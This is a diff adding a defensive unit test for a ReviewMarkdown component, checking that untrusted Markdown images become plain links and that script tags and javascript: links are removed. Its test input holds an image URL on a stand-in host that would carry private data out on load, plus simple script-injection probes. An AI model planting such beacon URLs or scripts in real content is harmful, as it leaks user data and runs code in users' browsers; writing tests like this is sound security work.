@@ -23,6 +23,14 @@ const LONG = [
 describe('ReviewMarkdown', () => {
   afterEach(cleanup)
 
+  it('renders untrusted Markdown images as explicit links without automatic network requests', () => {
+    const { container } = render(<ReviewMarkdown>{'![External diagram](https://untrusted.example/collect?sequence=private)\n\n<script>alert(1)</script>\n\n[Unsafe](javascript:alert(1))'}</ReviewMarkdown>)
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.querySelector('script')).toBeNull()
+    expect(screen.getByRole('link', { name: 'External diagram' })).toHaveAttribute('rel', 'noopener noreferrer')
+    expect(container.querySelector('a[href^="javascript:"]')).toBeNull()
+  })
+
   it('indexes the sections of a long document and links each to its heading', () => {
     const { container } = render(<ReviewMarkdown>{LONG}</ReviewMarkdown>)
 
